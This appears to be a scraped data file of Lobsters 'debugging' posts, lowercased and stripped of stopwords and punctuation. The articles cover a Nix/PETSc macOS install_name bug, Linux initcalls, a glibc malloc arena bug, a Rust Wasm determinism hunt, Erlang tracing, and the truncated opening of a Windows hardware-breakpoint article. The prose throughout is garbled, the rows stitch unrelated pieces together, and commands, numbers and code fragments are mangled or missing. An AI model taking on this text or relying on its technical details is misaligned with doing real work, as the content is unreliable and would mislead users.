invoked binwarpxm directory cleaned instead file privatetmp binary linked result petsc derivation nix store nixstore point seemed environment variable incorrectly set intermediate directory figure would learn lot linking o x ever expected whither linker first checked compiler linker flag inserted nix compiler wrapper come via nixcflagscompile nixldflags working nixshell direnv environment variable derivation injected shell simple matter echoing echo nixcflagscompile isystem echo nixldflags look fine invoking cmake make shell ought pull correct library remembered project us pkgconfig find pull together linked library frankly understand pkgconfig well know project invoked inside cmake search library according rule run nix done job setting everything therefore circumvents compiler linker flag checked happened pkgconfig installed setting nix environment therefore cmake able invoke system pkgconfig user path perhaps system version pkgconfig somehow finding wrong library indeed echo pkgconfigpath confirmed searching directory home thought possible wire got crossed adding dependency nix derivation one time configuring pkgconfig appropriately might help edit since tried pure shell clean path removed something bashrc nixshell source might cause common belief nixshell isolated user installed passing pure flag wrong fact keep user whole path around filed ticket address however using nixshell believe super useful tool even without hermetically isolating development environment referred nix wiki page c project also section using pkgconfig seems including pkgconfig derivation nativebuildinput let package like petsc append output path pkgconfigpath environment variable pkgsmkshell buildinputs pkgs nativebuildinputs pkgs pkgconfig fix problem would go deeper track bad library pulled digging cmake documentation project cmake file led insert trio print statement findpackage pkgconfig required pkgcheckmodules petsc petsc required linkdirectories petsclibrarydirs message petsc library petsclibraries message petsc library dirs petsclibrarydirs message petsc link library petsclinklibraries list append warpxmlinktargets petsclibraries printed three line cmake output petsc library petsc petsc library dirs petsc link library second two look good first library name petsc little implicit comfort precisely variable appended link target list compile time would linker find library petsc sure would look safer use absolute path dylib like list append warpxmlinktargets petsclibraries list append warpxmlinktargets petsclinklibraries thinking wrong sure linker look compile time path listed nixldflags thinking clearly flow data compilation process changing link target absolute path eased mind duration next cmake make cycle surely way linker could screw arcane library search involved absolute path possibly binwarpxm dyld library loaded referenced usersjacksrcwarpxmbuildbinwarpxm reason image found damn installname depravity point absolutely flummoxed every fix attempted grepped vainly offending privatetmp path build directory come emptyhanded tracked final irrevocable link option passed compiler tucked away linktxt file build tree showed incontrovertibly binary linked correct library cat buildsrccmakefileswarpxmdirlinktxt applicationsxcodeappcontentsdevelopertoolchainsxcodedefaultxctoolchainusrbinc dndebug isysroot proved nearly satisfaction cmake right thing library completely idea finally lucky google search led section nix manual describing issue specific darwin macos platform state darwin library linked using absolute path library resolved installname link time sometimes package set correctly causing library lookup fail runtime fixed adding extra linker flag running installnametool id fixupphase matteroffact way stating something understood flabbergasted best understanding happens macos source code include directive include petsch something like creates binary interface satisfied linker link time pas list absolute path library linker find one match interface linker save installname library found binary load section run time binary actually macos dyld system load library installname look certainly gotten aspect wrong would definitely appreciate hearing someone understands better case find pointed concept installname something go searching led helpful blog post describing exactly issue facing also described check installname library otool gotcha nix manual state package set correctly point fix use installnametool change installname built library petsc derivation nixpkgs correctly saw something installnametool prepatch substituteinplace configure replace binsh usrbinpython stdenvliboptionalstring stdenvisdarwin substituteinplace configinstallpy replace usrbininstallnametool installnametool directive replaces appearance string usrbininstallnametool installnametool reason nix package ensure build rely nixbuilt tool provided build shell path binary system directory like usrbin pr introduced substitution indicates fixed build darwin must invocation usrbininstallnametool petsc searching petsc repo lead line exactly mark log post installname instructed change installname absolute path library installation directory using installnametool id ospathsplitext dst dylib ospathisfile usrbininstallnametool output err flg selfexecuteshellcommand otool src oldname output outputfind n installname oldnamereplace ospathrealpath selfarchdir selfinstalldir selfexecuteshellcommand usrbininstallnametool id installname dst according installname library repaired petsc library built notice something second condition statement petsc derivation run prepatch step condition become ospathisfile installnametool certainly fail installnametool going file directory configure running patched configure script silently skip step leaving installname library temporary directory built luckily solution problem hard instead name program path pas absolute path program want run done overriding prepatch step like prepatch substituteinplace configure replace binsh usrbinpython stdenvliboptionalstring stdenvisdarwin substituteinplace configinstallpy replace usrbininstallnametool darwincctools bininstallnametool nix variable darwincctools expand full path built darwincctools derivation directory nixstore patched statement inside petsc configurepy becomes ospathsplitext dst dylib ospathisfile use installnametool installname resulting library correct check otool otool looking much better since error dynamically loaded library even recompile check working build git master binwarpxm dyld loaded usersjacksrcwarpxmbuildbinwarpxm dyld loaded dyld loaded dyld loaded dyld loaded like epilogue spent time debugging problem without working understanding different build phase clear neither cmake pkgconfig setup could cause time invoking cmake offending privatetmp directory long vanished focused exclusively petsc derivation provided nix might homed installnametool patch little sooner went lucky find note nix manual darwinspecific linker problem nix absolutely using remarkable little impact able use manage environment project without impacting way developer manage environment course asked would advocate try nix nice everyone able time also looking forward first contribution nix
46,Lobsters,debugging,Debugging,Utility to determine if ELF binary is built with debug sections,https://github.com/sbz/elfdbg,utility determine elf binary built debug section,elfdbg debug section elf elf usage build install test kyua kyuafile history,elfdbg project elfdbg utility program quickly identify elf binary built debug section debug section elf binary usually generated using g flag compiler compiler add new debug section binary program looking existence section name starting debug determine binary built debug information elf format wellknown standard elf ti reference specification available freebsd elf man page usage intented used shell script order avoid using file parsing output like file pathtobinary awk debuginfo print elf determine binary built debug use following elfdbg q pathtobinary echo symbol else echo binary debug symbol fi freebsd easily identify binary package missing debug using similar oneliner pkg info lgrep localbinwhile read echo elfdbg done build install makefile use standard bsd makefile build program make sudo make install linux use make f gnumakefile specify gnu makefile test test case implemented using freebsd test suite framework kyua kyuafile make test history wrote using libelf elf gelf api rewrote without relying libelf api
47,Lobsters,debugging,Debugging,An introduction to Linux kernel initcalls,https://www.collabora.com/news-and-blog/blog/2020/07/14/introduction-to-linux-kernel-initcalls/,introduction linux kernel initcalls,tracing support purpose usage elf section level corkami example moduleinit debugging introduced really nice video steven rostedt implementation postcore conclusion stage definition debug id level resource,initcalls serve call function boot implemented early development linux kernel required significant change since version released around tracing support added steven rostedt useful measure time spent initcall allow debugging read take closer look initcalls including purpose linux kernel usage create function call one definition way debug using initcalldebug ftrace well short overview implementation purpose usage mentioned purpose initcalls call function different stage boot process used many architecture driver git grep initcall driver arch wc l initcalls defined regular function init attribute one helper define type initcall want use list initcalls distribution code implementation explained next part blog post keep mind main idea behind initcalls using initcalls create elf section object file programmer creates needed function go specific section section iterated later kernel execute function located section corresponds one initcall level familiar elf extensible linking format file format see nice overview corkami example example initcall executed postcore stage static int init mypostcoreinit void return postcoreinitcall mypostcoreinit find many realworld example kernel instance proc filesystem entry creation kernel debug symbol atic int init kallsymsinit void proccreate kallsyms null kallsymsprocops return deviceinitcall kallsymsinit using initcalls implies benefit code modular maintainable nt need explicitly pas store call function pointer instead mark function appropriate level initcall automagically invoked appropriate time however knowing one used difficult distinguish level name reflects order initcall part initcall called understand dependency function executed sometimes using initcall necessary using moduleinit enough notice initcalls function used builtin module module also loadable moduleinit key moduleinit initcalls executed early stage initialization module one statically linked kernel module loadable builtin many module builtin loadable nt need executed early necessary device become usable example case use one last initcalls level moduleinit thanks save time consumed bootup let important probing function executed earlier module compiled builtin configuration moduleinit function called doinitcalls function simple link deviceinitcall function ie one last initcalls boot process code includelinuxmoduleh ifndef module define moduleinit x initcall x define moduleexit x exitcall x initcall calling deviceinitcall git grep initcall includelinux includelinuxinith define initcall fn deviceinitcall fn includelinuxmoduleh define moduleinit x initcall x case loadable module insertion time using syscalls initcalls function replaced moduleinit one else module define earlyinitcall fn moduleinit fn define coreinitcall fn moduleinit fn define postcoreinitcall fn moduleinit fn define archinitcall fn moduleinit fn define subsysinitcall fn moduleinit fn define fsinitcall fn moduleinit fn define rootfsinitcall fn moduleinit fn define deviceinitcall fn moduleinit fn define lateinitcall fn moduleinit fn define consoleinitcall fn moduleinit fn see use case second article go deeper moduleinit implementation summarize nt reason execute function early stage booting process use moduleinit module loaded case noncore driver debugging debug commandline parameter exists print message executing initcalls function use initcalldebug introduced commandline calling initcall returned usecs calling initcall returned usecs calling vfp support implementor architecture part variant rev initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs calling initcall returned usecs great debug parameter detect initcalls taking much time particularly case boottime improvement however debug log directly printed console printing message initcalls difficult retrieve particular information verbose log without great binary grep ftrace introducted initcalls familiar ftrace really nice video steven rostedt little example use case initcallstracing available event retrieved using debugfs entry mount debugfs nodev syskerneldebug cat syskerneldebugtracingavailableevents grep initcall initcall initcallfinish initcall initcallstart initcall initcalllevel familiar ftracing using initcalls little different need configure boot process add parameter commandline configure event want retrieve example commandline retrieve initcalllevel initcallstart initcallfinish event cat proccmdline earlyprintk rootwait traceeventinitcall initcalllevel initcall initcallstart initcall initcallfinish retrieve current event trace entry debugfs mount debugfs nodev syskerneldebug cat syskerneldebugtracingtrace tracer nop entriesinbufferentrieswritten irqsoff needresched hardirqsoftirq preemptdepth delay taskpid cpu timestamp function initcalllevel levelconsole initcallstart initcallfinish initcallstart initcallfinish initcalllevel levelearly initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart initcallfinish initcallstart n initcallfinish n initcallstart n initcallfinish n initcallstart ftrace logging allows great information detect portion code whose execution take lot time implementation know initcalls let look implemented linux kernel code one part implementation initcalls includelinuxinith define pureinitcall fn defineinitcall fn define coreinitcall fn defineinitcall fn define postcoreinitcall fn defineinitcall fn define archinitcall fn defineinitcall fn define subsysinitcall fn defineinitcall fn define fsinitcall fn defineinitcall fn define rootfsinitcall fn defineinitcall fn rootfs define deviceinitcall fn defineinitcall fn define lateinitcall fn defineinitcall fn initcalls defined thanks generic defineinitcall two argument function name id way order initcalls ordering according number look closer argument value equal rootfs rootfsinitcall initcalls defined using postcoreinitcall second argument main difference initcalls id number string see rootfs different depending type initcall used note let focus postcoreinitcall rest article define postcoreinitcall fn defineinitcall fn let look definition kernel source dummy example simple function defined postcore initcall postcoreinitcall definition calling defineinitcall id defineinitcall fn id calling another defineinitcall additional argument sec initcalls equal initcall id initcall postcore initcall last parameter last defineinitcall look like code expanded version many color right let take break keep explanation part next article conclusion first blog post seen overview initcalls purpose able call function different stage kernel booting process usage simply create function call one definition initcalls depending level booting process need coreinitcall postcoreinitcall fsinitcall deviceinitcall short explanation moduleinit function difference initcalls way debug initcalls initcalldebug ftrace useful case boottime must fast possible short overview implementation kernel initcall id corresponding level implementation based defineinitcall next part go deeper implementation initcalls particularly colorful deviceinitcall macro resource
48,Lobsters,debugging,Debugging,Graceful Degradation,https://www.solipsys.co.uk/new/GracefulDegradation.html?tg14lb,graceful degradation,graceful degradation software contact comment,graceful degradation first learned graceful degradation colleague prefaced story saying good people learn mistake best people learn people mistake bit like saying aviation circle good landing one walk away excellent landing use plane digress told learned graceful degradation message clear telling mistake could learn wish people willing make mistake public software industry would certainly benefit could learn everyone mistake story go broad outline forget detail like made comfortable living programming electronic till time programmed assembly language best output could hope debugging see whether opened till difficult work simulator higher level language debugger singlesteppers help really wrote code assembler transferred machine tested see worked sometimes colleague amazing work could get contract time wanted money good worked six month year whatever wanted rest time except christmas one biggest mistake would come back haunt large department store major capital city used till ran program one sophisticated system around till would keep list item sold central computer would interrogate till turn find much sold item would keep track many remained stock would project reordering would necessary reordering automatic staff would alerted stock low item decision could made loved system buffer stock could reduced reducing store overhead making entire store responsive consumer demand except christmas see every christmas system essence would simply stop entire floor till would stop responding refusing accept purchase unpredictable length time suddenly start working apparent reason apparent rhyme nothing could except call colleague get come fix poblem really nothing could either even worked problem problem capacity till would keep list item sold asked would dump list central computer would go back patronising servicing customer requirement asked problem heaviest time year simply much download queue till would fill central computer got back would stop wait download data could restart entire floor till would grind halt waiting download data restart floor would simply stop good busiest shopping time year really good patch run christmas make till run slightly slow still occasional full stopping moment general system would limp along exhibit catastrophic failure entire floor stopping difficulty judging exactly slow make till run also made central computer contact till clever pseudorandom way meant one till stopped floor others would probably still working done well apart faster communication system could deal load placed till could notice queue full start slowing performance system whole would degrade gracefully sale would slow slightly evenly across store come match processing throughput course would better system simply faster overloaded degrading gracefully usually better option simply stopping think next time worry system capacity better halt clear backlog degrade gracefully continue serve customer comment decided longer include comment directly via disqus system instead delighted get email people wish make comment engage discussion comment integrated page appropriate number emailscomments get large handle might return semiautomated system looking increasingly unlikely
49,Lobsters,debugging,Debugging,Erlang dbg Intro,https://antranigv.am/weblog_en/posts/erlang-dbg-intro/,erlang dbg intro,erlang elixir kernel process messaging facility many elixir tcp server application tree see,one programming language changed life erlang using erlang couple year moved elixir based erlang vm one important aspect erlang vm real vm kernel process messaging facility many lately debugging huge erlang application whose architecture familiar needed find way see kind message sent received module function called returning wanted write small howto case need future okay example using elixir tcp server simple tcp server get data sends back origin first let clone repo antranigv zvartnots prj git clone http githubcomsonatigranyanelixirtcpserver okay let run server antranigv zvartnots elixirtcpserver iex mix erlangotp source hipe compiling file ex generated tcpserver app interactive elixir press ctrlc exit type h enter help iex good default tcp server listens port specified application tree okay send data antranigv zvartnots elixirtcpserver echo test nc localhost test interactive way antranigv zvartnots elixirtcpserver nc localhost first mesage first mesage good tcp server good tcp server bye antranigv zvartnots elixirtcpserver good see connection closed server get bye okay say want trace dosend function observe get return iex dbgstart ok pid iex dbgtracer ok pid iex dbgtpl tcpserver dosend returntrace ok matched nonode nohost saved iex dbgp newprocesses c ok matched nonode nohost iex call elixirtcpserver dosend port message client n okay first start dbg facility start tracing server local node use function tpl specify local call want trace end use p function start tracing call c newprocesses dosend function called see get send bye see following returned elixirtcpserver ok happening software system running production either attaching node connecting folk
50,Lobsters,debugging,Debugging,Major Bug in glibc is Killing Applications With a Memory Limit,https://thehftguy.com/2020/05/21/major-bug-in-glibc-is-killing-applications-with-a-memory-limit/,major bug glibc killing application memory limit,tl dr bug glibc malloc mainly affect bit multithreading application special mention java application jvm seems always trigger worst case write quite long skip third section glibc malloc want ending introduction tracked pair dev production host part larger cluster ten host careful checking absent job running working well reassuring however ghost today lack better word possible let investigate host figure wrong particular let try restart done data disappear minute double checking process victory know sure something broken repro repro critical ingredient resolution tricky bug changed working software stop working due change configuration environment changed recently one change happening firmwide recent week may related firm deprecating bit literally everything bit year python must die year bit must die one challenge transitioning bit bit application memory leak combined lack memory limit solution almost trivial set memory limit default let say gb sure enough planned depreciation bit came along default memory limit every process host fit criterion early staging must received update quick check yes deployed process get memory limit odds killed reaching memory limit one problem though way job approach anywhere near gb memory java application jvm preallocates memory startup configured use exactly mb heap glibc malloc extra memory come malloc preallocates large chunk memory per thread meant performance optimization reduce memory contention highly threaded application bit runtime preallocate mb core bit runtime preallocate mb core mean preallocation gb ram process allocated memory count toward memory limit nasty bug preallocation glibc malloc memory limit rlimit application low rlimit ten gigabyte le risk hit bug terminated mitigate preallocation behavior adjusted environment variable heroku hadoop yarn edit todoenhancingmalloc like,story debugging case happy ending tl dr bug glibc malloc mainly affect bit multithreading application special mention java application jvm seems always trigger worst case write quite long skip third section glibc malloc want ending introduction developer reported issue one service asked help investigate sure digging service log noticed log handful instance barely noticeable percent normal activity go accounted tracked pair dev production host part larger cluster ten host come service running worrying failure notification alert issue reported user bank fairly critical fail missing extent knowledge failed twice recent year first time due bug happening rare circumstance one region second time due complete sudden loss datacenter case took significant amount time understand root cause almost one hour conclude certainty datacenter exploded mostly nonevent failover kicked within second rerouting activity side world long anybody could realize anything happened anything disaster recovery peak odds looking soontobe third issue except time catching early noticed gathering another coworker back serious debugging careful checking absent job running working well reassuring however ghost today lack better word trace activity debug log possible let investigate host figure wrong particular take long realize host missing piece around loggingmonitoring one easier bit investigate might one logstash agent running affected machine configuration look good run configuration check pass starting log yesterday must worked point let try restart done odd running fine back filling data missing would dead first place data disappear minute double checking process restart paying attention start dy one minute later repeat one time victory know sure something broken repro repro critical ingredient resolution tricky bug changed meaningful error indicating configuration issue application issue jvm issue let restart keeping close look memory consumption going multiple gigabyte die working software stop working due change configuration environment changed recently context firm mono repo thousand developer hundred thousand job deployed every day almost exclusively python shop one change happening firmwide recent week may related firm deprecating bit literally everything bit year python must die year bit must die make perfect sense server operating system bit two decade desktop one many application database middleware run bit require gb memory major library dropping bit support one challenge transitioning bit bit application memory leak combined lack memory limit bit world leaky application consume memory approaching gb memory limit adressable bit crash bit world leaky application consume memory limit exhausting resource host crashing task major recurring source issue deploying application solution almost trivial set memory limit default let say gb available bit large margin extra overheard sure enough planned depreciation bit came along default memory limit every process well announced staged gradually course couple service blew immediately fixed setting memory limit gb whatever high number urgency call accuracy back dying service common host fit criterion early staging must received update quick check yes deployed process get memory limit restart failing process monitor carefully work fine one minute memory increasing dy odds killed reaching memory limit one problem though way job approach anywhere near gb memory java application jvm preallocates memory startup configured use exactly mb heap glibc malloc extra memory come long story short due bug malloc well bug feature malloc preallocates large chunk memory per thread meant performance optimization reduce memory contention highly threaded application bit runtime preallocate mb coresin bit runtime preallocate mb core typical physical server dual xeon cpu terabyte ram core count easily core cpu hyper threading mean preallocation gb ram process much exactly depends application rule thumb requires multithreaded application reason jvm always seem trigger worst case asked belt prepared one thousand case allocated memory count toward memory limit process fails dying one minute allocatingdeallocating memory different thread triggering preallocation side effect reach limit get terminated nasty bug preallocation glibc malloc memory limit rlimit application low rlimit ten gigabyte le risk hit bug terminated mitigate preallocation behavior adjusted environment variable deployment system set memory limit must set variable major scheduler cloud hosting mitigation outofthebox see heroku hadoop yarn value disable likely reduce performance percent recommended interestingly enough supposed performance optimization benchmark internet show net degradation performance value go digit around higher default hundred seems whack arena core edit found write issue referenced glibc wiki page todoenhancingmalloc throttle number arena based process rlimit process startup andor everytime rlimitas modified like like loading
51,Lobsters,debugging,Debugging,Hunting down a non-determinism-bug in our Rust Wasm build,https://dev.to/gnunicorn/hunting-down-a-non-determinism-bug-in-our-rust-wasm-build-4fk1,hunting nondeterminismbug rust wasm build,ama rust subreddit wednesday july today parity technology bit background substrate stack parity polkadot network substrate wasm runtimes deterministic build test nightly build nightly build old version pretty large pr introspecting wasm great mozilla wasm explainer extensive great wasm documentation original working group translates module code base finding source memory db implemented great implementation provided crate version default feature disabled reveals hashbrown would activate feature ahash hasher would include feature leaking fixing removing dependency pin memorydb added proper cicheck labelrabbithole sausage made digging llvm output find llvm code commit master bug commit fix backporting compiler fix backport patch accepted merged rustc update submodule eddyb museum victoria sharing arctic expedition photo free reuse unsplash,note together colleague hosting ama rust subreddit wednesday july today come join u question part code base handle thing parity technology recently learned webassembly build system nt deterministic longer short summary chase bug hope help others facing similar issue give help guidance try kind thing work bit background substrate stack parity building software run next generation web trustless secure web notably building polkadot network based substrate substrate natively compatible polkadot thus making simple secure blockchain communicate polkadot network built everything using rust mean legacy codebase open source wasm runtimes key architecture feature substrate chainspecific state transition function stf separated rest node binary webassembly wasm blob stored chain key code separation allows networkwide upgrade state transition function independently rest client event happen onchain governance mechanism client utilizes wasm runtime executing updated wasm blob community decides implement upgrade mechanism allow substratebased blockchains evolve without complicated aspect hard fork call forklessupgrades participant stay sync network without relying upgrading client way achieve building rustruntimecode separate crate target wasm blob store chain deterministic build wasm overall great invention providing thin multiplattform abstraction machine language target thus wasm output compiler easily translated actual machine code needed execution however webassemblz human readable make hard audit people vote upon chain upgrade upgrading blockchain state transition function ca nt taken back voting opaque block particularly instilling confidence user way approach problem deterministic build rust compiler guarantee build deterministic meaning compiling code twice yield resulting binary however parity managed solve problem code least within environment o compiler libs installed reasonably deterministic set target consistent among allows u produce dockerimage build description confirming rust source file indeed result binary blob proposed next chain runtime using docker image auditor look source code directly wade bytecode whilein past recently discovered two consecutive build runtime code yield wasm blob anymore starting point realized build process broken unfortunately nt yet tooling place alert u problem nt know introduced bug however know last worked sure information track problem test first step towards fix devising test reproducibly display problem case rather simple build specific package project noderuntime twice compare resulting wasm used hash compiler output specific step cargo build release p noderuntime build first time wasm store hash cargo clean clean artifact cargo build release p noderuntime build c build identical nightly build within wasm build using feature yet fully supported rust compiler team aka tier need nightly version use nightly moving fast feature added left right often time unexpected side effect affecting determinism unlikely upgrading nightly broke build luckily old rust nightly build available rustup cargo amazing tooling rust provides easy use compile compiler version first installed old version via rustup install install nightly rustup toolchain add wasm target toolchain compiler version install last nightly version target toolchain know produce deterministic build note despite name nt released every night often compiler component fail build version skipped building crate add cargo command tell version use cargo build release p noderuntime build first time wasm store checksum cargo clean clean build cargo build release p noderuntime build c build identical unfortunately nt nightly back nt produce wasm current version code either older version nightly build old version checking old version code building old compiler indeed deterministic changed compiler building old code latest compiler also yield deterministic build know nt change compiler causing determinism break nt mean nt compiler bug whatever nt introduced side change u git bisect one great thing using popular among developer tool others add tooling top make life easier lesser known super useful tool made mainline git already year ago git bisect help identify changeset introduced bug applying binary search commit history essentially tell git bisect checkout know git bisect good git bisect bad check changeset middle two perform test indicate status via git bisect good git bisect bad command jump middle latest known good bad one check go git bisect tell first change bug git bisect run even allows specify command run either succeeds fails let git perform step automatically unfortunately nt script ready time actually building complicated rsyncremotebuild system run pretty awesome git bisect identified pretty large pr culprit pretty large add significant amount code also first activated feature default runtime testing namely sessionhistorical already suspected related issue unfortunately also nt yield one line cause side could still number aspect cause one way forward could activate one feature another move closer closer actual source nt easy sound opted wasmintrospection first git bisect powerful tool often crucial help narrow scope search bug like episode illustrates seldom pinpoint specific line code introspecting wasm wasm output rust compiler binary blob modern standard introspection feature built importantly textrepresentation called wat converted back forth without problem default wasm toolchain already includes handy tool running wasm output first build second build give u humanparsable representation binary diff two wat version identify changed omitted line marked legibility call lt sptrie nodeheader nodeheader parityscalecodec codec encode gt localget brif brif localset br br end localget call lt sptrie nodeheader nodeheader parityscalecodec codec encode gt localget brif brif localset br br end localset export dataend global export heapbase global data data data formatting trait implementation returned diff rather short bit scrolling great mozilla wasm explainer extensive great wasm documentation original working group quickly learn first four change label might different numbering compiler internals caused last change last one odd though global memory address location filled differently prefixed value make particuarly odd searched addressnumber original wat file find marked mutable table funcref global mut global global pretty weird considering context running blob remember blob stored onchain transparent everyone execution block wasm memory reset new instance created general mutable globals pointless wasm producing would live duration execution single block want mutate state runtime persisted block call external databasestorage function generally nt mutable lazystatics alike code nt mean globals pointless wasm used compiler optimisation example every time create new vec reading default value global address quicker need le storage pasting value everywhere causing memory address allocated would mutuable different value every build digging deeper well track used compiler would nt mark mutable nt changed least searching find read time also see written func lt gt type param local globalget localtee globalset block label block label block label block label block label block label block label block label block label call rustalloc localtee brif localget localget localtee localget even without knowing much webassembly interesting hint function name lt gt translates provingtrie generatefor session historical module code base indentation many label indicate within loop loop looking code identify three object mutable time none global least far see wasm clearly finding source precise point focus begin troubleshooting unfortunately git wo nt help u could trace back change code base activated specific change set already identified little help identify source error impl trait provingtrie fn generatefor validators result self static str intoiterator item validatorid fullidentification let mut db memorydb default let mut root default default let mut trie triedbmut new mut db mut root validator fullid validatorsintoiter enumerate let let key match sessionmodule loadkeys validator none continue k k let fullid validator fullid map key owner index keyid key keyids let key keysgetraw keyid let re keyid key usingencoded k iusingencoded v trieinsert k v let resmaperr failed insert trie map owner index full identification let iusingencoded k fullidusingencoded v trieinsert k v maperr failed insert trie ok provingtrie db root looking code three main object involved also helpful minimal understanding code base see two object root memorydb passed trie likely calculating new trie root trieinsert let iusingencoded k fullidusingencoded v trieinsert k v called thing actually see mutatating state pass element memorydb memory db implemented pub struct memorydb h kf h keyhasher kf keyfunction h data hashmap kf key hashednullnode h nullnodedata kf phantomdata kf us hashmap hashmaps tricky fixedmemory environment like wasm go detail hashmaps use simplistic fast hashing function cause collision degrade performance hashmap point resulting do whole process decent modern hashmap therefore add randomness relying hashing key rust stdimplementation example however source randomness nt exist within environment making generic particular std hashmaps unsafe usercontrolled input well nt input user could easily control use bomb hashmap fine fact modern implementation require source randomness something investigate nostd like wasm environment memorydb implementation take great implementation provided hashbrown crate version default feature disabled cargotoml reveals important note defaultfeatures disabled otherwise hashbrown would activate compiletimerng feature ahash hasher utilizes internally defaultfeatures activated hasher would include constrandom generate random seed hasher compile time randomness similar problem debugging global constant updated add new key slightly different every compile feature leaking default feature deactivated could snuck build still well looking one line lower cargotoml reveals answer order fix different compatibilty bug memorydb attempt pin ahash crate nonbroken version activates default feature cargo feature additive meaning one activates feature instance crate within build feature activated thus leaking build boom fixing might noticed linking specific older commits crate one side give longterm correct link secondly specific version use also problem already partially address newer version latest ahash nt feature part default anymore need activated explictly removing dependency pin memorydb nt needed anymore releasing new version problem gone test step prove test added proper cicheck every pr must pas notice early broke labelrabbithole nt pas pr fix issue yet cicheck complains running script directly diffing wat tell u call lt sptrie nodeheader nodeheader parityscalecodec codec encode gt localget brif brif localset br br end localget call lt sptrie nodeheader nodeheader parityscalecodec codec encode gt localget brif brif localset br br end localset although bug fixed label issue persistent assumed caused fixed bug bug darn br brif control flow condition mean marking respective block stopping point addition execution continue considering diffs code jump seems differ caused ordering label compiler likely marking occurs method label sorted within compiler final processing specifcially storing item nondeterminstic collection internally eg hashmap etc common place happens optimization step build wasmwat debug mode without release flag diff nt show change thus strongly indicating introduced somewhere optimization phase sausage made rust rust compiler particular full reimplementation compiler built compiler toolchain called llvm allows rust focus implementing syntax feature leaving heavy lifting impressive suite llvm compiler tooling rustc vv even tell much rustc nightly vv rustc binary rustc commithash commitdate host release llvm version llvm modern flexible compiler framework huge range supported platform compile target way achieved compiling language abstract inbetween representation called llvmir feed llvm compiler compiled machine code requested target result rust one first language directly support compiling wasm addition releaselevel optimization nt actually happen within rust compiler llvm framework though llvm mostly hidden sight case rust allows u pas various argument get data inspect swapping build specific rustc command append compiler flag compiler case interested learning different step taken optimization run c llvmargsprintafterall added piping entire output file quickly noticed output big work running parallel multiple thread resulted unparsable output adding z noparallelllvm fix example still unwieldy deal fortunately random relabeling happens funtion call everytime thus isolating exact call result thin test case compiler bug digging llvm output looking wat tracing back differing output find located func lt l gt type param order create reproducible test need version tell u actual input use compiler internals help passing result get comprehensive compiler symbol wat func type param pas rustfilt cargo install rustfilt make human readable rustfilt core ptr dropinplace triedb triedbmut triedbmut sptrie layout spruntime trait alrighty specific enough u create build something analyze replacing main librs static reference adding relevant dependency thecargotoml cfgattr feature std nostd nomangle pub static foo unsafe fn mut triedb triedbmut triedbmut static sptrie layout spruntime trait core ptr dropinplace short crate trigger bug code path analyzing llvm output compile cargo rustc p tinypackage release c llvmargsprintafterall z noparallelllvm clean example look llvm output diffs two run revealing first change successor successor assumed internal order processing change run happens step ir dump webassembly fix irreducible control flow find llvm code generally speaking compiler bug name step supposed prevent exactly problem experincing found bug external repo first thing see issue already reported patched indeed find commit master yet released expected llvm also store internal state nonorderpersistent way eg hashmaps randomized key ensure order processed yielded deterministic sorted processing patch certain condition namely fixing set mutual loop entry nt reliably done appears code triggered bug within llvmir representation patching local llvm rustc multiple run confirm bug commit fix although bug probably present older version compiler new code base actually triggered path would lead backporting compiler fix though fix merged llvm back february nt yet part release candidate probably part upcoming llvm release unfortunately rust rather slow picking porting latest version llvm regardless rust team open backports llvm migrate rather quickly nightly version rust interested result get fixed nightlt compiler pretty soon time writing backport patch accepted merged waiting rustc update submodule credit gratitude eddyb tremendous help especially compiler part thing knowing fiddling around llvm args pin bug llvm also thanks museum victoria sharing arctic expedition photo free reuse unsplash used header picture
52,Lobsters,debugging,Debugging,Hardware breakpoints and exceptions on Windows,https://ling.re/hardware-breakpoints/,hardware breakpoints exception window,preface quick primer debug register intel sdm amd apm usage window exception blog post written daax malicious us debugging malware cheating common detection vector getthreadcontext exception handler mov drx instruction checking using debug register credit reference intel software developer manual amd architecture programmer manual applied reverse engineering exception interrupt detecting debugger abusing bad assumption within window byepg defeating patchguard using exceptionhooking,hardware breakpoints mainly used debugging purpose unlike regular breakpoints require code modification versatile often used debugging target utilise antidebug tactic article detail inner working hardware breakpoints window go common us detection method preface research blog conducted window possible certain technique might similar window however focus blog post moreover technique likely differ lot operating system linux osx architectural difference quick primer debug register reader familiar debug register skip ahead hardware breakpoints available implemented help debug register named register bit long respectively layout register architecture seen figure worry layout seems confusing go register detail want learn finer detail debug register intel sdm amd apm great resource figure layout debug register referred debug address register addressbreakpoint register simple contain linear address breakpoint address match instruction data reference breakpoint occur debug register used finegrained control condition breakpoint register need filled linear address work even paging turned case linear address physical address register available possible maximum breakpoints simultaneously per thread referred reserved debug register despite name might suggest always reserved still used functionality depends value de field control register bit enabled io breakpoints enabled attempting access one register result ud exception generated however de bit enabled debug register mapped respectively done compatibility software older processor hardware breakpoint triggered debug status stored debug register register referred debug status register contains bit quickly check certain event got triggered bit set based hardware breakpoint triggered used quickly check breakpoint triggered bit called bd set current exception triggered access debug register gd bit must enabled type exception triggered bit called b set current exception triggered single step tf flag must enabled eflags register type exception triggered bit called t set current exception triggered current task switched task debug trap flag enabled referred debug control register allows finegrained control hardware breakpoint first bit control specific hardware breakpoint enabled even bit called enable breakpoint locally meaning trigger breakpoint exception detected current task uneven bit called enable breakpoint globally meaning trigger breakpoint exception detected task breakpoint enabled locally corresponding bit get removed hardware task switch occurs avoid unwanted breakpoints new task bit get cleared enabled globally bit called le ge legacy feature anything modern processor bit used instruct processor detect exact instruction breakpoint occurred breakpoint condition modern processor exact compatibility older hardware recommend always set bit bit called gd interesting bit enabled debug exception generated whenever instruction try access debug register distinguish type exception normal hardware breakpoint exception bd flag enabled debug register bit commonly used stop program interfering debug register important keep mind exception happens instruction executed flag automatically removed processor debug exception handler entered however solution perfect work using mov instruction access debug register inaccessible usermode testing getthreadcontext setthreadcontext function trigger event make detection unable used usermode bit used control condition size hardware breakpoint register bit divided field first bit used condition type hardware breakpoint possible generate debug exception instruction execution data write io read write data read write io read write enabled de field control register enabled otherwise condition undefined behaviour size controlled using last bit used specify size memory location specified address available size byte byte byte byte usage usage debug register fairly straightforward special instruction exist move content generalpurpose register debug register viceversa however instruction executed privilege level otherwise gp exception generated allow usermode application change debug register window added support changed register using setthreadcontext getthreadcontext api example usage function demonstrated following snippet initialize context structure context context contextcontextflags contextall fill context structure current thread context getthreadcontext getcurrentthread context set local execution hardware breakpoint testfunc testfunc 